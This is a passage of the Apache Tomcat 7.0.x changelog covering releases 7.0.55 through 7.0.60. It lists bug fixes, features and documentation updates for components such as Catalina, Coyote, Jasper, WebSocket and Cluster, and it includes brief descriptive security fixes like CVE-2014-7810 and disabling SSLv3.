update | Update the minimum recommended version of the Tomcat Native library (if used) to 1.1.33. (markt) | |  | **Jasper** | | --- | | | fix | [57136](https://bz.apache.org/bugzilla/show_bug.cgi?id=57136): Ensure only `\${` and `\#{` are treated as escapes for `${` and `#{` rather than `\$` and `\#` being treated as escapes for `$` and `#` when processing literal expressions in expression language. (markt) | | --- | --- | | fix | [57148](https://bz.apache.org/bugzilla/show_bug.cgi?id=57148): When coercing an object to a given type and a `PropertyEditor` has been registered for the type correctly coerce the empty string to `null` if the `PropertyEditor` throws an exception. (kkolinko/markt) | |  | **Cluster** | | --- | | | fix | Remove unnecessary method that always returns true. The domain filtering works on `DomainFilterInterceptor`. (kfujino) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Correct a bug in the `permessage-deflate` implementation that meant that the incorrect op-codes were used if an uncompressed message was converted into more than one compressed message. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Fix possible resource leaks by closing streams properly. Issues reported by Coverity Scan. (fschumacher) | | --- | --- | | fix | [56058](https://bz.apache.org/bugzilla/show_bug.cgi?id=56058): Add links to the AccessLogValve documentation for configuring reverse proxies and/or Tomcat to ensure that the desired information is used entered in the access log when Tomcat is running behind a reverse proxy. (markt) | | fix | [57503](https://bz.apache.org/bugzilla/show_bug.cgi?id=57503): Make clear that the JULI integration for log4j only works with log4j 1.2.x. (markt) | | fix | Remove incorrect note from context configuration page in the documentation web application that stated WAR files located outside the appBase were never unpacked. (markt) | | update | [57644](https://bz.apache.org/bugzilla/show_bug.cgi?id=57644): Update examples to use Apache Standard Taglib 1.2.5. (jboynes) | | fix | [57683](https://bz.apache.org/bugzilla/show_bug.cgi?id=57683): Ensure that if a client aborts their connection to the stock ticker example (the only way a client can disconnect), the example continues to work for existing and new clients. (markt) | | fix | Correct the documentation for deployOnStartup to make clear that if a WAR file is updated while Tomcat is stopped and unpackWARs is true, Tomcat will not detect the changed WAR file when it starts and will not replace the unpacked WAR file with the contents of the updated WAR. (markt) | |  | **Extras** | | --- | | | fix | [57377](https://bz.apache.org/bugzilla/show_bug.cgi?id=57377): Remove the restriction that prevented the use of SSL when specifying a bind address with the JMXRemoteLifecycleListener. Also enable SSL to be configured for the registry as well as the server. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | Make sure that refuse the messages from a different domain in `DomainFilterInterceptor`. (kfujino) | | --- | --- | |  | **Other** | | --- | | | add | Enhance bean factory used for JNDI resources. New attribute `forceString` allows to support non-standard string argument property setters. (rjung) | | --- | --- | | fix | Fix `TestAbstractAjpProcessor` unit test failures on Windows. (kkolinko) | | fix | Guard the digester from MbeansDescriptorsDigesterSource with its own lock object. (fschumacher) | | fix | [57558](https://bz.apache.org/bugzilla/show_bug.cgi?id=57558): Add missing JAR in Ant task definition required by the validate task. (markt/kkolinko) | | add | List names of Testsuites that have failed or skipped tests when running tests with Ant. (kkolinko) | | fix | [57703](https://bz.apache.org/bugzilla/show_bug.cgi?id=57703): Update the `http-method` definition for web applications using a Servlet 2.5 descriptor as per Servlet 2.5 MR 6. (markt) | | update | Update to Tomcat Native Library version 1.1.33 to pick up the Windows binaries that are based on OpenSSL 1.0.1m and APR 1.5.1. (markt) | | | |  | **Tomcat 7.0.59 (violetagg)** | **released 2015-02-04** | | --- | --- | | | **Jasper** | | --- | | | fix | [57504](https://bz.apache.org/bugzilla/show_bug.cgi?id=57504): Initialize TLD locations cache when creating the ServletContext. (jboynes) | | --- | --- | |  | **Tribes** | | --- | | | fix | Fix a possible deadlock when receiver thread invokes `mapMemberAdded()` while ping thread invokes `memberAlive()`. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.58 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [57173](https://bz.apache.org/bugzilla/show_bug.cgi?id=57173): Revert the fix for [56953](https://bz.apache.org/bugzilla/show_bug.cgi?id=56953) that broke annotation scanning in some cases. (markt) | | --- | --- | | fix | [57178](https://bz.apache.org/bugzilla/show_bug.cgi?id=57178): The CORS filter now treats `null` as a valid origin that matches `*`. Patch provided by Gregor Zurowski. (markt) | | fix | [57180](https://bz.apache.org/bugzilla/show_bug.cgi?id=57180): Do not limit the CORS filter to only accepting requests that use an HTTP method defined in RFC 7231. (markt) | | fix | [57190](https://bz.apache.org/bugzilla/show_bug.cgi?id=57190): Fix `ServletContext.getContext(String)` when parallel deployment is used so that the correct ServletContext is returned. (markt) | | fix | [57208](https://bz.apache.org/bugzilla/show_bug.cgi?id=57208): Prevent NPE in JNDI Realm when no results are found in a directory context for a user with specified user name. Based on a patch provided by Jason McIntosh. (violetagg) | | add | [57209](https://bz.apache.org/bugzilla/show_bug.cgi?id=57209): Add a new attribute, userSearchAsUser to the JNDI Realm. (markt) | | fix | [57215](https://bz.apache.org/bugzilla/show_bug.cgi?id=57215): Ensure that the result of calling `HttpServletRequest.getContextPath()` is neither decoded nor normalized as required by the Servlet specification. (markt) | | fix | [57216](https://bz.apache.org/bugzilla/show_bug.cgi?id=57216): Improve handling of invalid context paths. A context path should either be an empty string or start with a `'/'` and do not end with a `'/'`. Invalid context path are automatically corrected and a warning is logged. The `null` and `"/"` values are now correctly changed to `""`. (markt/kkolinko) | | fix | Correct message that is logged when load-on-startup servlet fails to load. It was logging a wrong name. (kkolinko) | | fix | [57239](https://bz.apache.org/bugzilla/show_bug.cgi?id=57239): Correct several message typos. Includes patch by vladk. (kkolinko) | | add | Make the session id generator extensible by adding a `SessionIdGenerator` interface, an abstract base class and a standard implementation. (rjung) | | add | Back-port clarification from Servlet 3.1 specification that during async processing an `IllegalStateException` should be thrown if `getRequest()` or `getResponse()` is called after `complete()` or `dispatch()`. (markt) | | fix | Fix a concurrency issue in async processing. Ensure that a non-container thread can not change the async state until the container thread has completed. (markt) | | fix | [57252](https://bz.apache.org/bugzilla/show_bug.cgi?id=57252): Provide application configured error pages with a chance to handle an async error before the built-in error reporting. (markt) | | fix | [57281](https://bz.apache.org/bugzilla/show_bug.cgi?id=57281): Enable non-public Filter and Servlet classes to be configured programmatically via the Servlet 3.0 API and then used without error when running under a SecurityManager. (markt) | | fix | [57308](https://bz.apache.org/bugzilla/show_bug.cgi?id=57308): Remove unnecessary calls to `System.getProperty()` where more suitable API calls are available. (markt) | | add | Add unit tests for RemoteAddrValve and RemoteHostValve. (rjung) | | add | Allow to configure RemoteAddrValve and RemoteHostValve to adopt behavior depending on the connector port. Implemented by optionally adding the connector port to the string compared with the patterns `allow` and `deny`. Configured using `addConnectorPort` attribute on valve. (rjung) | | add | Optionally trigger authentication instead of denial in RemoteAddrValve and RemoteHostValve. This only works in combination with `preemptiveAuthentication` on the application context. Configured using `invalidAuthenticationWhenDeny` attribute on valve. (rjung) | | fix | Prevent file descriptors leak and ensure that files are closed after retrieving the last modification time. (violetagg) | | fix | [57326](https://bz.apache.org/bugzilla/show_bug.cgi?id=57326): Enable `AsyncListener` implementations to re-register themselves during `AsyncListener.onStartAsync`. (markt) | | fix | [57331](https://bz.apache.org/bugzilla/show_bug.cgi?id=57331): Allow ExpiresFilter to use "year" as synonym for "years" in its configuration. (kkolinko) | | update | Improve SnoopServlet in unit tests. (rjung) | | add | Add RequestDescriptor class to unit tests. Adjust TestRewriteValve to use RequestDescriptor. (rjung) | | update | Add more AJP unit tests. (rjung) | | fix | [57363](https://bz.apache.org/bugzilla/show_bug.cgi?id=57363): Log to stderr if LogManager is unable to read configuration files rather than swallowing the exception silently. (markt) | | fix | [57420](https://bz.apache.org/bugzilla/show_bug.cgi?id=57420): Make UEncoder a local variable in DirContextURLConnection to make it threadsafe. Based on ideas from kkolinko and violetagg. (fschumacher) | | fix | [57425](https://bz.apache.org/bugzilla/show_bug.cgi?id=57425): Don't add attributes with null value or name to the replicated context. (fschumacher) | | add | [57431](https://bz.apache.org/bugzilla/show_bug.cgi?id=57431): Enable usage of custom class for context creation when using embedded tomcat. (fschumacher) | | fix | [57446](https://bz.apache.org/bugzilla/show_bug.cgi?id=57446): Ensure that `ServletContextListener`s that have limited access to `ServletContext` methods are called with the same `ServletContext` instance for both `contextInitialized()` and `contextDestroyed()`. (markt) | | fix | [57461](https://bz.apache.org/bugzilla/show_bug.cgi?id=57461): When an instance of `org.apache.catalina.startup.VersionLoggerListener` logs the result of `System.getProperty("java.home")` don't report it in a manner that makes it look like the `JAVA_HOME` environment variable. (markt) | | fix | While closing streams for given resources ensure that if an exception happens it will be handled properly. Issue is reported by Coverity Scan. (violetagg) | | fix | Change Response to use UEncoder instances with shared safeChars. (fschumacher) | | add | Allow `VersionLoggerListener` to log all system properties. This feature is off by default. (kkolinko) | |  | **Coyote** | | --- | | | fix | [57234](https://bz.apache.org/bugzilla/show_bug.cgi?id=57234): Make SSL protocol filtering to remove insecure protocols case insensitive. (markt) | | --- | --- | | fix | [57265](https://bz.apache.org/bugzilla/show_bug.cgi?id=57265): Fix some potential concurrency issues with sendFile and the NIO connector. (markt) | | fix | [57324](https://bz.apache.org/bugzilla/show_bug.cgi?id=57324): If the client uses `Expect: 100-continue` and Tomcat responds with a non-2xx response code, Tomcat also closes the connection. If Tomcat knows the connection is going to be closed when committing the response, Tomcat will now also send the `Connection: close` response header. (markt) | | fix | [57340](https://bz.apache.org/bugzilla/show_bug.cgi?id=57340): When using Comet, ensure that Socket and SocketWrapper are only returned to their respective caches once on socket close (it is possible for multiple threads to call close concurrently). (markt) | | fix | [57446](https://bz.apache.org/bugzilla/show_bug.cgi?id=57446): Ensure that `ServletContextListener`s that have limited access to `ServletContext` methods are called with the same `ServletContext` instance for both `contextInitialized()` and `contextDestroyed()`. (markt) | |  | **Jasper** | | --- | | | fix | CVE-2014-7810: Do not use a privileged code block when evaluating EL expressions when running under a security manager, which allowed to bypass code restrictions. (markt) | | --- | --- | | fix | Fix an issue with BeanELResolver when running under a security manager. Some classes may not be accessible but may have accessible interfaces. (markt) | | fix | [57316](https://bz.apache.org/bugzilla/show_bug.cgi?id=57316): Fix JspC when directory name contains a character sequence that appears to be URL encoded. (markt) | |  | **Cluster** | | --- | | | fix | In order to enable define in `Cluster` element, `ClusterSingleSignOn` implements `ClusterValve`. (kfujino) | | --- | --- | | fix | Fix mbean descriptor of `ClusterSingleSignOn`. (kfujino) | | fix | [57473](https://bz.apache.org/bugzilla/show_bug.cgi?id=57473): Add sanity check to FarmWebDeployer's WarWatcher to detect suspected incorrect permissions on the watch directory. (schultz) | |  | **WebSocket** | | --- | | | fix | Correct multiple issues with the flushing of batched messages that could lead to duplicate and/or corrupt messages. (markt) | | --- | --- | | fix | Correctly implement headers case insensitivity. (markt/remm) | | fix | Allow optional use of user extensions. (remm) | | fix | Allow using partial binary message handlers. (remm) | | fix | Limit ping/pong message size. (remm) | | fix | Allow configuration of the time interval for the periodic event. (remm) | | fix | More accurate annotations processing. (remm) | | fix | Allow optional default for origin header in the client. (remm) | | fix | [57490](https://bz.apache.org/bugzilla/show_bug.cgi?id=57490): Make it possible to use Tomcat's WebSocket client within a web application when running under a SecurityManager. Based on a patch by Mikael Sterner. (markt) | | add | Add some debug logging to the WebSocket session to track session creation and session closure. (markt) | |  | **Web applications** | | --- | | | fix | Update documentation for CGI servlet. Recommend to copy the servlet declaration into web application instead of enabling it globally. Correct documentation for cgiPathPrefix. (kkolinko) | | --- | --- | | update | Improve HTML version of build instructions and align with BUILDING.txt. Document creating second Eclipse project to compile WebSocket classes with Java 7 (`ide-eclipse-websocket` target added in 7.0.56). (kkolinko) | | update | Improve Tomcat Manager documentation. Rearrange, add section on HTML GUI, document /expire command and Server Status page. (kkolinko) | | fix | Fix ambiguity of section links on Valves configuration reference page. (kkolinko) | | update | [57238](https://bz.apache.org/bugzilla/show_bug.cgi?id=57238): Update information on SSL/TLS on Security and SSL documentation pages. Based on patch by Glen Peterson. (kkolinko) | | add | [57261](https://bz.apache.org/bugzilla/show_bug.cgi?id=57261): Add vminfo and threaddump commands to Manager application. Implement `VminfoTask` and `ThreaddumpTask` Ant tasks. (kkolinko) | | fix | [57323](https://bz.apache.org/bugzilla/show_bug.cgi?id=57323): Correct display of outdated sessions in sessions count listing in Manager application. (kkolinko) | | add | Add document of `ClusterSingleSignOn`. (kfujino) | | update | Clarify documentation for `useBodyEncodingForURI` attribute of a connector. (kkolinko) | |  | **Other** | | --- | | | update | When downloading required libraries at build time, use random name for temporary file and automatically create destination directory (`base.path`). (kkolinko) | | --- | --- | | update | Update optional Checkstyle library to 6.1.1. (kkolinko) | | update | Simplify `setproxy` task in `build.xml`. Taskdef there is not needed since Ant 1.8.2. (kkolinko) | | fix | Improve Java 7 support in `build.xml`. Check whether the specified ${java.7.home} is valid. By default use Java that runs Ant (${java.home}) instead of the one found on $PATH to run JUnit tests. (kkolinko) | | add | [57344](https://bz.apache.org/bugzilla/show_bug.cgi?id=57344): Provide sha1 checksum files for Tomcat downloads. Correct filename patterns for apache-tomcat-\*-embed.tar.gz archive to exclude an \*.asc file. (kkolinko) | | | |  | **Tomcat 7.0.57 (violetagg)** | **released 2014-11-11** | | --- | --- | | | **Catalina** | | --- | | | add | [47919](https://bz.apache.org/bugzilla/show_bug.cgi?id=47919): Extend the information logged when Tomcat starts to optionally log the values of command line arguments (enabled by default) and environment variables (disabled by default). Note that the values added to CATALINA\_OPTS and JAVA\_OPTS environment variables will be logged, as they are used to build up the command line. (markt) | | --- | --- | | add | [56401](https://bz.apache.org/bugzilla/show_bug.cgi?id=56401): Log version information when Tomcat starts. (markt/kkolinko) | | fix | [57022](https://bz.apache.org/bugzilla/show_bug.cgi?id=57022): Ensure SPNEGO authentication continues to work with the JNDI Realm using delegated credentials with recent Oracle JREs. (markt) | | fix | Correct a couple of NPEs in the JNDI Realm that could be triggered with when not specifying a roleBase and enabling roleSearchAsUser. (markt) | | fix | Remove the unnecessary registration of context.xml as a redeploy resource. The context.xml having an external docBase has already been registered as a redeploy resources at first. (kfujino) | | fix | Improve the previous fix for [56401](https://bz.apache.org/bugzilla/show_bug.cgi?id=56401). Avoid logging version information in the constructor since it then gets logged at undesirable times such as when using `StoreConfig`. (markt) | | fix | [57105](https://bz.apache.org/bugzilla/show_bug.cgi?id=57105): When parsing web.xml do not limit the buffer element of the jsp-property-group element to integer values as the allowed values are `<number>kb` or `none`. (markt) | | update | Update the minimum required version of the Tomcat Native library (if used) to 1.1.32. (markt) | | update | [57144](https://bz.apache.org/bugzilla/show_bug.cgi?id=57144): Improve ClientAbortException to provide non-null message. (kkolinko) | | fix | AsyncContext should remain usable until fireOnComplete is called. (remm) | | fix | AsyncContext createListener should wrap any instantiation exception using a ServletException. (remm) | |  | **Coyote** | | --- | | | add | [53952](https://bz.apache.org/bugzilla/show_bug.cgi?id=53952): Add support for TLSv1.1 and TLSv1.2 for APR connector. Based upon a patch by Marcel Šebek. This feature requires Tomcat Native library 1.1.32 or later. (schultz/jfclere) | | --- | --- | | add | Disable SSLv3 by default for JSSE based HTTPS connectors (BIO and NIO). The change also ensures that SSLv2 is disabled for these connectors although SSLv2 should already be disabled by default by the JRE. (markt) | | add | Disable SSLv3 by default for the APR/native HTTPS connector. (markt) | | fix | Do not increase remaining counter at end of stream in IdentityInputFilter. (kkolinko) | | fix | Async state MUST\_COMPLETE should still be started. (remm) | |  | **Jasper** | | --- | | | fix | [57099](https://bz.apache.org/bugzilla/show_bug.cgi?id=57099): Ensure that semi-colons are not permitted in JSP import page directives. (markt) | | --- | --- | |  | **Cluster** | | --- | | | fix | Avoid possible integer overflows reported by Coverity Scan. (fschumacher) | | --- | --- | |  | **WebSocket** | | --- | | | fix | [57054](https://bz.apache.org/bugzilla/show_bug.cgi?id=57054): Correctly handle the case in the WebSocket client when the HTTP response to the upgrade request can not be read in a single pass; either because the buffer is too small or the server sent the response in multiple packets. (markt) | | --- | --- | | fix | Fix client subprotocol handling. (remm) | | fix | Add null checks for arguments in remote endpoint. (remm/kkolinko) | | fix | [57091](https://bz.apache.org/bugzilla/show_bug.cgi?id=57091): Work around the behaviour of the Oracle JRE when creating new threads in an applet environment that breaks the WebSocket client implementation. Patch provided by Niklas Hallqvist. (markt) | | fix | [57118](https://bz.apache.org/bugzilla/show_bug.cgi?id=57118): Ensure that an `EncodeException` is thrown by `RemoteEndpoint.Basic.sendObject(Object)` rather than an `IOException` when no suitable `Encoder` is configured for the given Object. (markt) | |  | **Web applications** | | --- | | | fix | Correct documentation for `ServerCookie.ALLOW_NAME_ONLY` system property. (kkolinko) | | --- | --- | | fix | [57049](https://bz.apache.org/bugzilla/show_bug.cgi?id=57049): Clarified that `jvmRoute` can be set in `<Engine>`'s `jvmRoute` or in a system property. (schultz) | | fix | Correct version of Java WebSocket mentioned in documentation (s/1.0/1.1/). (markt/kkolinko) | | update | In examples web application move Async and Comet examples from JSP to Servlet examples page. (kkolinko) | | update | Suppress timestamp comments and enable charset header in Javadoc. (kkolinko) | |  | **jdbc-pool** | | --- | | | fix | [57079](https://bz.apache.org/bugzilla/show_bug.cgi?id=57079): Use Tomcat version number for jdbc-pool module when building and shipping the module as part of Tomcat. (markt/kkolinko) | | --- | --- | | fix | Fix broken overview page in javadoc generated via "javadoc" task in jdbc-pool build.xml file. (kkolinko) | |  | **Other** | | --- | | | update | [56079](https://bz.apache.org/bugzilla/show_bug.cgi?id=56079): The Apache Tomcat Windows service and the Apache Tomcat Windows service monitor application are now digitally signed. (markt) | | --- | --- | | fix | Fix timestamps in Tomcat build and jdbc-pool to use 24-hour format instead of 12-hour one and use UTC timezone. (markt/kkolinko) | | update | Improve Tomcat build script to ensure that only one ecj-nn.jar file is present in Tomcat `lib` directory when Eclipse JDT Compiler is updated to a new version. (kkolinko) | | update | [56596](https://bz.apache.org/bugzilla/show_bug.cgi?id=56596): Update to Tomcat Native Library version 1.1.32 to pick up the Windows binaries that are based on OpenSSL 1.0.1j and APR 1.5.1. (markt) | | code | In Tomcat tests: log name of the current test method at start time. (kkolinko) | | | |  | **Tomcat 7.0.56 (violetagg)** | **released 2014-10-06** | | --- | --- | | | **Catalina** | | --- | | | fix | When scanning class files (e.g. for annotations) and reading the number of parameters in a `MethodParameters` structure only read a single byte (rather than two bytes) as per the JVM specification. Patch provided by Francesco Komauli. (markt) | | --- | --- | | fix | Allow the JNDI Realm to start even if the directory is not available. The directory not being available is not fatal once the Realm is started and it need not be fatal when the Realm starts. Based on a patch by Cédric Couralet. (markt) | | fix | [56736](https://bz.apache.org/bugzilla/show_bug.cgi?id=56736): Avoid an incorrect `IllegalStateException` if the async timeout fires after a non-container thread has called `AsyncContext.dispatch()` but before a container thread starts processing the dispatch. (markt) | | fix | [56739](https://bz.apache.org/bugzilla/show_bug.cgi?id=56739): If an application handles an error on an application thread during asynchronous processing by calling `HttpServletResponse.sendError()`, then ensure that the application is given an opportunity to report that error via an appropriate application defined error page if one is configured. (markt) | | fix | [56771](https://bz.apache.org/bugzilla/show_bug.cgi?id=56771): When lookup for a resource in all the alternate or backup `javax.naming.directory.DirContext`, `javax.naming.NameNotFoundException` will be thrown at the end of the search if the resource is not available in these alternate or backup `javax.naming.directory.DirContext`. Based on a patch by Sheldon Shao. (violetagg) | | fix | [56796](https://bz.apache.org/bugzilla/show_bug.cgi?id=56796): Remove unnecessary sleep when stopping a web application. (markt) | | fix | [56801](https://bz.apache.org/bugzilla/show_bug.cgi?id=56801): Improve performance of `org.apache.tomcat.util.file.Matcher` which is to filter JARs for scanning during web application start. Based on a patch by Sheldon Shao. (kkolinko) | | fix | [56825](https://bz.apache.org/bugzilla/show_bug.cgi?id=56825): Enable pre-emptive authentication to work with the SSL authenticator. Based on a patch by jlmonteiro. (markt) | | fix | [56857](https://bz.apache.org/bugzilla/show_bug.cgi?id=56857): Fix thread safety issue when calling ServletContext methods while running under a security manager. (markt) | | code | [56882](https://bz.apache.org/bugzilla/show_bug.cgi?id=56882): Add testcase for processing of forwards and includes when Context have been reloaded. (kkolinko) | | fix | [56900](https://bz.apache.org/bugzilla/show_bug.cgi?id=56900): Fix some potential resource leaks when reading property files reported by Coverity Scan. Based on patches provided by Felix Schumacher. (markt) | | fix | [56902](https://bz.apache.org/bugzilla/show_bug.cgi?id=56902): Fix a potential resource leak in the Default Servlet reported by Coverity Scan. Based on a patch provided by Felix Schumacher. (markt) | | fix | [56903](https://bz.apache.org/bugzilla/show_bug.cgi?id=56903): Correct the return value for `StandardContext.getResourceOnlyServlets()` so that multiple names are separated by commas. Identified by Coverity Scan and fixed based on a patch by Felix Schumacher. (markt) | | fix | Fixed the multipart elements merge operation performed during web application deployment. Identified by Coverity Scan. (violetagg) | | fix | Correct the information written by `ExtendedAccessLogValve` when a format token x-O(XXX) is used so that multiple values for a header XXX are separated by commas. Identified by Coverity Scan. (violetagg) | | fix | Fix a potential resource leak when reading MANIFEST.MF file for extension dependencies reported by Coverity Scan. (violetagg) | | fix | Correctly handle multiple `accept-language` headers rather than just using the first header to determine the user's preferred Locale. (markt) | | fix | Fix some potential resource leaks when reading properties, files and other resources. Reported by Coverity Scan. (violetagg) | | fix | When using parallel deployment and `undeployOldVersions` feature is enabled on a Host, correctly undeploy context of old version. Make sure that Tomcat does not undeploy older Context if current context is not running. (kfujino) | | fix | When deploying war, add XML file in the config base to the redeploy resources if war does not have META-INF/context.xml or `deployXML` is false. If XML file is created in the config base, redeploy will occur. (kfujino) | | code | Various changes to reduce unnecessary code in Tomcat's copy of Apache Commons BCEL to reduce the time taken for annotation scanning when web applications start. Includes contributions from kkolinko and hzhang9. (markt) | | fix | [56938](https://bz.apache.org/bugzilla/show_bug.cgi?id=56938): Ensure web applications that have mixed case context paths and are deployed as directories are correctly removed on undeploy when running on a case sensitive file system. (markt) | | add | [57004](https://bz.apache.org/bugzilla/show_bug.cgi?id=57004): Add `stuckThreadCount` property to `StuckThreadDetectionValve`'s JMX bean. Patch provided by Jiří Pejchal. (schultz) | | fix | [57011](https://bz.apache.org/bugzilla/show_bug.cgi?id=57011): Ensure that the request and response are correctly recycled when processing errors during async processing. (markt) | | fix | [57016](https://bz.apache.org/bugzilla/show_bug.cgi?id=57016): When using the `PersistentValve` do not remove sessions from the store when persisting them. (markt) | |  | **Coyote** | | --- | | | fix | [56780](https://bz.apache.org/bugzilla/show_bug.cgi?id=56780): Enable Tomcat to start when using SSL with an IBM JRE in strict SP800-131a mode. (markt) | | --- | --- | | fix | [56910](https://bz.apache.org/bugzilla/show_bug.cgi?id=56910): Prevent the invalid value of `-1` being used for `maxConnections` with APR connectors. (markt) | | fix | Ensure that `AjpNioProtocol` and `AjpAprProtocol` enable the `KeepAliveTimeout`. (kfujino) | |  | **Jasper** | | --- | | | fix | [43001](https://bz.apache.org/bugzilla/show_bug.cgi?id=43001): Enable the JspC Ant task to set the JspC option `mappedFile`. (kkolinko) | | --- | --- | | fix | [56797](https://bz.apache.org/bugzilla/show_bug.cgi?id=56797): When matching a method in an EL expression, do not treat bridge methods as duplicates of the method they bridge to. In this case always call the target of the bridge method. (markt) | | fix | Correct a logic error in the `JasperElResolver`. There was no functional impact but the code was less efficient as a result of the error. Based on a patch by martinschaef. (markt) | | fix | Ensure that the implementation of `javax.servlet.jsp.PageContext.include(String)` and `javax.servlet.jsp.PageContext.include(String, boolean)` will throw `IOException` when an I/O error occur during the operation. (violetagg) | | fix | [56908](https://bz.apache.org/bugzilla/show_bug.cgi?id=56908): Fix some potential resource leaks when reading jar files. Reported by Coverity Scan. Based on patch provided by Felix Schumacher. (violetagg) | | fix | [56991](https://bz.apache.org/bugzilla/show_bug.cgi?id=56991): Deprecate the use of a request attribute to pass a <jsp-file> declaration to Jasper and prevent an infinite loop if this technique is used in conjunction with an include. (markt) | | fix | Fix a potential resource leak in JDTCompiler when checking whether a resource is a package. Reported by Coverity Scan. (fschumacher) | |  | **WebSocket** | | --- | | | code | [56446](https://bz.apache.org/bugzilla/show_bug.cgi?id=56446): Clearer handling of exceptions when calling a method on a POJO based WebSocket endpoint. Based on a suggestion by Eugene Chung. (markt) | | --- | --- | | fix | [56746](https://bz.apache.org/bugzilla/show_bug.cgi?id=56746): Allow secure WebSocket client threads to use the current context class loader rather than explicitly setting it to the class loader that loaded the WebSocket implementation. This allows WebSocket client connections from within web applications to access, amongst other things, the JNDI resources associated with the web application. (markt) | | fix | [56905](https://bz.apache.org/bugzilla/show_bug.cgi?id=56905): Make destruction on web application stop of thread group used for WebSocket connections more robust. (kkolinko/markt) | | fix | [56907](https://bz.apache.org/bugzilla/show_bug.cgi?id=56907): Ensure that client IO threads are stopped if a secure WebSocket client connection fails. (markt) | | fix | When a WebSocket client attempts to write to a closed connection, handle the resulting `IllegalStateException` in a manner consistent with the handling of an `IOException`. (markt) | | add | Add support for the `permessage-deflate` extension. This is currently limited to decompressing incoming messages on the server side. It is expected that support will be extended to outgoing messages and to the client side shortly. (markt) | | add | Extend support for the `permessage-deflate` extension to compression of outgoing messages on the server side. (markt) | | fix | [56982](https://bz.apache.org/bugzilla/show_bug.cgi?id=56982): Return the actual negotiated extensions rather than an empty list for `Session.getNegotiatedExtensions()`. (markt) | | update | Update the WebSocket implementation to support the Java WebSocket specification version 1.1. (markt) | |  | **Web applications** | | --- | | | fix | Correct the label in the list of sessions by idle time for the bin that represents the idle time immediately below the maximum permitted idle time when using the expire command of the Manager application. (markt) | | --- | --- | | update | Update the Windows authentication documentation after some additional testing to answer the remaining questions. (markt) | | fix | Correct a couple of broken links in the Javadoc. (markt) | |  | **Other** | | --- | | | add | [56788](https://bz.apache.org/bugzilla/show_bug.cgi?id=56788): Display the full version in the list of installed applications when installed via the Windows installer package. Patch provided by Alexandre Garnier. (markt) | | --- | --- | | add | [56829](https://bz.apache.org/bugzilla/show_bug.cgi?id=56829): Add the ability for users to define their own values for `_RUNJAVA` and `_RUNJDB` environment variables. Be more strict with executable filename on Windows (s/java/java.exe/). Based on a patch by Neeme Praks. (markt/kkolinko) | | fix | [56895](https://bz.apache.org/bugzilla/show_bug.cgi?id=56895): Correctly compose `JAVA_OPTS` in `catalina.bat` so that escape sequences are preserved. Patch by Lucas Theisen. (markt) | | update | [56988](https://bz.apache.org/bugzilla/show_bug.cgi?id=56988): Allow to use relative path in `base.path` setting when building Tomcat. (kkolinko) | | fix | [56990](https://bz.apache.org/bugzilla/show_bug.cgi?id=56990): Ensure that the `ide-eclipse` build target downloads all the libraries required by the default Eclipse configuration files and configures Eclipse to use Java 6 for the project. Add build target `ide-eclipse-websocket` that creates a separate linked project that compiles websocket classes of Tomcat 7 with Java 7 compiler. (kkolinko) | | | |  | **Tomcat 7.0.55 (violetagg)** | **released 2014-07-27** | | --- | --- | | | **Catalina** | | --- | | | fix | [44312](https://bz.apache.org/bugzilla/show_bug.cgi?id=44312): Log an error if there is a conflict between Host and Alias names. Improve host management methods in `Mapper` to avoid occasionally removing a wrong host. Check that host management operations are performed on the host and not on an alias. (kkolinko) | | --- | --- | | fix | [55282](https://bz.apache.org/bugzilla/show_bug.cgi?id=55282): Ensure that one and the same application listener is added only once when starting the web application. (violetagg) | | add | [56461](https://bz.apache.org/bugzilla/show_bug.cgi?id=56461): New `failCtxIfServletStartFails` attribute on Context and Host configuration to force the context startup to fail if a load-on-startup servlet fails its startup. (slaurent) | | add | [56526](https://bz.apache.org/bugzilla/show_bug.cgi?id=56526): Improved the `StuckThreadDetectionValve` to optionally interrupt stuck threads to attempt to unblock them. (slaurent) | | fix | [56545](https://bz.apache.org/bugzilla/show_bug.cgi?id=56545): Pre-load an additional class, the loading of which may otherwise be triggered by a web application which in turn would trigger an exception when running under a security manager. (kkolinko) | | fix | [56578](https://bz.apache.org/bugzilla/show_bug.cgi?id=56578): Correct regression in the fix for [56339](https://bz.apache.org/bugzilla/show_bug.cgi?id=56339) that prevented sessions from expiring when using clustering. (markt) | | code | [56588](https://bz.apache.org/bugzilla/show_bug.cgi?id=56588): Update deprecation of Context.addApplicationListener() methods according to changes in Tomcat 8. (kkolinko) | | fix | [56600](https://bz.apache.org/bugzilla/show_bug.cgi?id=56600): In WebdavServlet: Do not waste time generating response for broken PROPFIND request. (kkolinko) | | fix | Provide a better error message when asynchronous operations are not supported by a filter or servlet. Patch provided by Romain Manni-Bucau. (violetagg) | | fix | [56606](https://bz.apache.org/bugzilla/show_bug.cgi?id=56606): User entries in `tomcat-users.xml` file are recommended to use "username" attribute rather than legacy "name" attribute. Fix inconsistencies in Windows installer, examples. Update digester rules and documentation for `MemoryRealm`. (markt/kkolinko) | | code | [56611](https://bz.apache.org/bugzilla/show_bug.cgi?id=56611): Refactor code to remove inefficient calls to `Method.isAnnotationPresent()`. Based on a patch by Jian Mou. (markt/kkolinko) | | fix | [56653](https://bz.apache.org/bugzilla/show_bug.cgi?id=56653): Fix concurrency issue with lists of contexts in `Mapper` when stopping Contexts. (kkolinko) | | fix | [56657](https://bz.apache.org/bugzilla/show_bug.cgi?id=56657): When using parallel deployment, if the same session id matches different versions of a web application, prefer the latest version. Ensure that remapping selects the version that we expect. (kkolinko) | | fix | Assert that mapping result object is empty before performing mapping work in `Mapper`. (kkolinko) | | fix | [56658](https://bz.apache.org/bugzilla/show_bug.cgi?id=56658): Avoid delay between registrations of mappings for context and for its servlets. (kkolinko) | | fix | [56665](https://bz.apache.org/bugzilla/show_bug.cgi?id=56665): Correct the generation of the effective web.xml when elements contain an empty string as value. (violetagg) | | fix | [56666](https://bz.apache.org/bugzilla/show_bug.cgi?id=56666): When clearing the SSO cookie use the same values for domain, path, httpOnly and secure as were used to set the SSO cookie. (markt) | | fix | [56677](https://bz.apache.org/bugzilla/show_bug.cgi?id=56677): Ensure that `HttpServletRequest.getServletContext()` returns the correct value during a cross-context dispatch. (markt) | | fix | [56684](https://bz.apache.org/bugzilla/show_bug.cgi?id=56684): Ensure that Tomcat does not shut down if the socket waiting for the shutdown command experiences a `SocketTimeoutException`. (markt) | | fix | When the current PathInfo is modified as a result of 